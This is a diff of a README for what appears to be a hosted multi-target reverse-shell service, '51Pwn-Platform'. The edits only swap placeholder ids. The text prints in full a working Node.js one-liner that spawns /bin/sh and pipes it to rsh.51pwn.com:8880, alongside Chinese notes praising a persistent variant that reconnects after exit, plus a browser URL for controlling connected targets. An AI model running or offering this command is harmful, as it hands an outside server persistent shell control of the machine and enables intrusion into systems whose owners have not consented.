@@ -3,7 +3,7 @@ one id Multi-target
 ![xx](https://github.com/hktalent/51Pwn-Platform/assets/18223385/d2d503a6-7fed-428b-8cec-6ef78af2adb7)
 <img width="760" alt="image" src="https://github.com/hktalent/51Pwn-Platform/assets/18223385/bcb19c88-eba2-4ddb-9f54-9691b5729a81">
 
-- Site: https://51pwn.com/indexes/xterm.html?id=yourId
+- Site: https://51pwn.com/indexes/xterm.html?id=YourId
 - reverse server: rsh.51pwn.com:8880
 
 * 1 one id Multi-target concurrency reverse shell
@@ -18,7 +18,7 @@ one id Multi-target
 Note: A good reverse shell will keep reconnecting to the server even if you type exit
   注意：一个优秀的reverse shell会吃重要，即便你输入 exit 也会不断重新连接到服务器
 ```
-node -e '(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(8880, "rsh.51pwn.com", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client);client.write("xxxx_001\n");client.write("{}\n") }); return /a/;})();'
+node -e '(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(8880, "rsh.51pwn.com", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client);client.write("YourId\n");client.write("{}\n") }); return /a/;})();'
 ```
   *** 特别推荐下面的命令，经过若干 AI 的优化，可以覆盖 90% 以上的服务器上正确运行, 下面的命令明显比上面的更加优化，即便你关闭浏览器，或者输入exit，下面的代码会自动重新上线
 ```
@@ -26,7 +26,7 @@ node -e '(function(){ var net = require("net"), cp = require("child_process"), s
 ```
 * open your browser
   *** 注意后面的id必须和上面的一致
-https://51pwn.com/indexes/xterm.html?id=xxxx_001
+https://51pwn.com/indexes/xterm.html?id=YourId
  ** 注意，这个时候你什么也没有看见，没错，因为还没有目标连接上来 **
 
 """
